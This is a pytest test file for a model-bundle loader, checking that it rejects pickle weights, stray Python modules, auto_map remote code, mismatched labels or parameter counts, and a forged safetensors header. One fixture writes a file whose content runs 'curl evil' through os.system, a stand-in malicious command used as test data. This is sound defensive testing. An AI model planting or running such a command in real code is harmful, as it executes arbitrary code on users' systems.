import json
import struct

import pytest

from sealedai_ml.loader import BundleRejected, inspect_bundle, load_bundle


def _edit(path, fn):
    data = json.loads(path.read_text())
    fn(data)
    path.write_text(json.dumps(data))


def test_accepts_allowlisted_distilbert(seller_bundle):
    model, tok, card = load_bundle(seller_bundle)
    assert card["architecture"] == "DistilBertForSequenceClassification"
    assert model.config.id2label[1] == "outage"


def test_rejects_bin_weights(bundle_copy):
    (bundle_copy / "pytorch_model.bin").write_bytes(b"\x80\x04 not today")
    with pytest.raises(BundleRejected, match="unexpected files"):
        inspect_bundle(bundle_copy)


def test_rejects_pickle(bundle_copy):
    (bundle_copy / "optimizer.pkl").write_bytes(b"\x80\x04")
    with pytest.raises(BundleRejected, match="unexpected files"):
        inspect_bundle(bundle_copy)


def test_rejects_python_file(bundle_copy):
    (bundle_copy / "modeling_evil.py").write_text("import os; os.system('curl evil')")
    with pytest.raises(BundleRejected, match="unexpected files"):
        inspect_bundle(bundle_copy)


def test_rejects_auto_map(bundle_copy):
    _edit(bundle_copy / "config.json", lambda c: c.update(auto_map={"AutoModel": "modeling_evil.Evil"}))
    with pytest.raises(BundleRejected, match="auto_map"):
        inspect_bundle(bundle_copy)


def test_rejects_unknown_architecture(bundle_copy):
    _edit(bundle_copy / "config.json", lambda c: c.update(architectures=["GPT2LMHeadModel"]))
    with pytest.raises(BundleRejected, match="allowlist"):
        inspect_bundle(bundle_copy)


def test_rejects_label_mismatch(bundle_copy):
    _edit(bundle_copy / "card.json", lambda c: c.update(labels=["billing", "other", "outage"]))
    with pytest.raises(BundleRejected, match="id2label"):
        inspect_bundle(bundle_copy)


def test_rejects_param_count_mismatch(bundle_copy):
    _edit(bundle_copy / "card.json", lambda c: c.update(parameters=c["parameters"] * 2))
    with pytest.raises(BundleRejected, match="parameter count"):
        load_bundle(bundle_copy)


def test_rejects_lying_safetensors_header(bundle_copy, seller_bundle):
    st = bundle_copy / "model.safetensors"
    st.unlink()  # break the hard link before rewriting
    data = (seller_bundle / "model.safetensors").read_bytes()
    (n,) = struct.unpack("<Q", data[:8])
    header = json.loads(data[8 : 8 + n])
    name = next(k for k in header if k != "__metadata__")
    header[name]["data_offsets"][1] += 10_000_000_000  # claims bytes far beyond the file
    hb = json.dumps(header).encode()
    st.write_bytes(struct.pack("<Q", len(hb)) + hb + data[8 + n :])
    with pytest.raises(BundleRejected, match="outside the file|cover"):
        inspect_bundle(bundle_copy)
